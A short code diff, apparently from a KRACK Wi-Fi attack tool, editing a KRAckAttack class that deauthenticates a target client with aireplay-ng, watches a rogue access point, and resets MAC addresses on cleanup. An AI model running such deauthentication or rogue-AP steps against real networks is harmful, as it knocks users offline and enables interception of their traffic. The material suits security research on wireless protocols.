@@ -640,8 +640,8 @@ class KRAckAttack():
 		subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
-		if self.clientmac:
-			self.queue_disas(self.clientmac)
+		# if self.clientmac:
+		# 	self.queue_disas(self.clientmac)
 
 		# Continue attack by monitoring both channels and performing needed actions
 		self.last_real_beacon = time.time()
@@ -673,7 +673,6 @@ class KRAckAttack():
 				log(WARNING, "WARNING: Didn't receive beacon from rogue AP for two seconds")
 				self.last_rogue_beacon = time.time()
 
-
 	def stop(self):
 		log(STATUS, "Closing hostapd and cleaning up ...")
 		if self.hostapd:
@@ -686,7 +685,7 @@ class KRAckAttack():
 
 		subprocess.call(["ifconfig", self.nic_real_clientack, "down"])
 		subprocess.call(["ifconfig", self.nic_rogue_ap, "down"])
-		
+
 		subprocess.call(["macchanger", "-p", self.nic_real_clientack])
 		subprocess.call(["macchanger", "-p", self.nic_rogue_ap])
 
